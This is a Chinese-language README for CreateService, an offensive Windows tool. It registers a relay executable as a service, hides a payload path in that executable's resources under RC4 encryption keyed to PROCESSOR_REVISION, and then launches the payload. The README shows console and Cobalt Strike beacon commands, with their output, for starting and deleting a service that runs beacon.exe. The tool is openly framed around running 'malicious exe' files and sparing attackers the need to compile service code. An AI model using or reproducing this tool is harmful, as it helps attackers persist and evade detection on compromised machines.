# CreateService

## 文件说明

- CreateService : 创建服务与删除服务主程序
- CreateServiceDll ： 创建服务与删除服务rdi
- TransitEXE ：媒介程序

```
C:\Users\Administrator\Desktop>CreateService.exe "C:\Users\Administrator\Desktop\TransitEXE.exe" "C:\Users\Administrator\Desktop\test.exe" test start
[*] CreateService by Uknow
    [+] ServiceName: test
    [+] TransitPathName: C:\Users\Administrator\Desktop\TransitEXE.exe
    [+] EvilPathName: C:\Users\Administrator\Desktop\test.exe
    [+] Success! Service successfully Create and Start.
```

程序将TransitEXE.exe创建为服务，并将路径`C:\Users\Administrator\Desktop\test.exe`进行rc4加密（密钥为当前计算机的环境变量PROCESSOR_REVISION）写入`C:\Users\Administrator\Desktop\TransitEXE.exe`的资源文件中。

服务创建成功后，TransitEXE.exe从自身的资源中解密获取到恶意exe的路径并运行。

这样就只需要提供恶意exe即可，免除临时编译服务模块代码。



## Cobalt Strike RDI
```
beacon> CreateService C:\Users\Administrator\Desktop\TransitEXE.exe C:\Users\Administrator\Desktop\beacon.exe test start
[*] Tasked beacon to spawn CreateService ....
[+] arguments are:C:\Users\Administrator\Desktop\TransitEXE.exe C:\Users\Administrator\Desktop\beacon.exe test start
[+] host called home, sent: 103053 bytes
[+] received output:
[*] CreateService by Uknow
    [+] ServiceName: test
    [+] TransitPathName: C:\Users\Administrator\Desktop\TransitEXE.exe
    [+] EvilPathName: C:\Users\Administrator\Desktop\beacon.exe
    [+] Success! Service successfully Create and Start.

beacon> CreateService C:\Users\Administrator\Desktop\TransitEXE.exe C:\Users\Administrator\Desktop\beacon.exe test stop
[*] Tasked beacon to spawn CreateService ....
[+] arguments are:C:\Users\Administrator\Desktop\TransitEXE.exe C:\Users\Administrator\Desktop\beacon.exe test stop
[+] host called home, sent: 103052 bytes
[+] received output:
[*] CreateService by Uknow
    [+] ServiceName: test
    [+] TransitPathName: C:\Users\Administrator\Desktop\TransitEXE.exe
    [+] EvilPathName: C:\Users\Administrator\Desktop\beacon.exe
    [+] Success! Service successfully Stop and Delete.
```

